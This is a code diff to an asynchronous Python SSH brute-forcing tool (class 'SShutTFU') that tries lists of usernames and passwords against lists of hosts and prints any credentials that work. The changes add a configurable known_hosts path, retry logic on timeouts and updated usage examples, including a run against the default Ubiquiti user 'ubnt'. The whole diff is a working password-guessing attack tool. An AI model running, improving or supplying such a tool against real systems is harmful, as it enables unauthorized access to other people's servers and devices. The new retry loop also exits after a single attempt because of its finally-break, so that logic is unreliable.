@@ -11,12 +11,12 @@ log = logging.basicConfig(format='ssh_auth 🠖 %(message)s', level=logging.WARN
 
 
 class SShutTFU:
-    def __init__(self, host_file, user_file, pass_file, workers):
+    def __init__(self, host_file, user_file, pass_file, workers, known_hosts):
         self.host_file = self._return_list(host_file)
         self.user_file = self._return_list(user_file)
         self.pass_file = self._return_list(pass_file)
         self.workers = int(workers)
-        self.known_hosts = "/home/notroot/.ssh/known_hosts"
+        self.known_hosts = known_hosts
         self.ignore_hosts = []
 
     @staticmethod
@@ -49,32 +49,34 @@ class SShutTFU:
 
     async def worker(self, queue):
         while queue.empty() is not True:
-            h = u = p = None
-            try:
-                h, u, p = await queue.get()
-                if h in self.ignore_hosts:
+            h, u, p = await queue.get()
+            timeout_retry = 0
+            if h in self.ignore_hosts:
+                continue
+            while True:
+                try:
+                    t = 22
+                    if ':' in h:
+                        h, t = h.split(':')
+                    k = self.known_hosts
+                    if timeout_retry == 0:
+                        print(f"Attempting {u} {p} on host {h}                                              \r", end='')
+                    else:
+                        print(f"Retry {timeout_retry} Attempting {u} {p} on host {h}                        \r", end='')
+                    await asyncio.wait_for(asyncssh.connect(h, username=u, port=t, password=p, known_hosts=k), timeout=5)
+                    print(f" 🠖 Credentials Found: {h} - User:{u} Pass:{p}                                            ")
+                except asyncssh.PermissionDenied:
+                    pass
+                except (TimeoutError, asyncio.TimeoutError):
+                    timeout_retry += 1
+                    if timeout_retry >= 10:
+                        break
                     continue
-                t = 22
-                if ':' in h:
-                    h, t = h.split(':')
-                k = self.known_hosts
-                print(f"Attempting {u} {p} on host {h}                                              \r", end='')
-                await asyncio.wait_for(asyncssh.connect(h, username=u, port=t, password=p), timeout=5)
-                print(f" 🠖 Credentials Found: {h} - User:{u} Pass:{p}                                          ")
-            except asyncssh.PermissionDenied:
-                pass
-            except (TimeoutError, asyncio.TimeoutError):
-                print('timeout')
-                if h not in self.ignore_hosts:
-                    self.ignore_hosts.append(h)
-                    print(f"\nHost {h} is taking too long to respond. Sending to ignore list.\n")
-                continue
-            except asyncssh.misc.ProtocolError as e:
-                continue
-            except Exception:
-                raise
-            finally:
-                queue.task_done()
+                except asyncssh.misc.ProtocolError as e:
+                    break
+                finally:
+                    queue.task_done()
+                    break
         return
 
     async def main(self):
@@ -110,14 +112,16 @@ def usage():
     u = f"""
     USAGE:
       {argv[0]} -h "192.168.1.2" -u "ubnt" -p /tmp/passwords.txt
-      {argv[0]} -h "/path/hosts.txt" -u /path/users.txt -p /path/passwords.txt
-      {argv[0]} -h "/path/hosts.txt" -u /path/users.txt -p /path/passwords.txt -w 20
+      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt
+      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20 
+      {argv[0]} -h /path/hosts.txt -u /path/users.txt -p /path/passwords.txt -w 20 -k /tmp/known_hosts
 
     OPTIONS:
-      '-h', '--hosts'      - Set the hostname or path to file containing host or host:port.
-      '-u', '--users'      - Set the username or path to file containing users.
-      '-p', '--passwords'  - Set the password or path to file containing passwords.
-      '-w', '--workers'    - Set the number of workers to run during attempts.
+      '-h', '--hosts'        - Set the hostname or path to file containing host or host:port.
+      '-u', '--users'        - Set the username or path to file containing users.
+      '-p', '--passwords'    - Set the password or path to file containing passwords.
+      '-w', '--workers'      - Set the number of workers to run during attempts.
+      '-k', '--known_hosts'  - Set the full path location to your ~/.ssh/known_hosts 
 
     """
     print(u)
@@ -130,6 +134,7 @@ if __name__ == "__main__":
     parser.add_argument('-u', '--users', action='store', dest='users', default='')
     parser.add_argument('-p', '--passwords', action='store', dest='passwords', default='')
     parser.add_argument('-w', '--workers', action='store', dest='workers', default='')
+    parser.add_argument('-k', '--known_hosts', action='store', dest='known_hosts', default='')
     arg = None
 
     try:
@@ -145,7 +150,10 @@ if __name__ == "__main__":
     if not arg.workers:
         arg.workers = 10
 
-    pwner = SShutTFU(arg.hosts, arg.users, arg.passwords, arg.workers)
+    if not arg.known_hosts:
+        arg.known_hosts = "/tmp/known_hosts"
+
+    pwner = SShutTFU(arg.hosts, arg.users, arg.passwords, arg.workers, arg.known_hosts)
     asyncio.run(pwner.main())
 
 
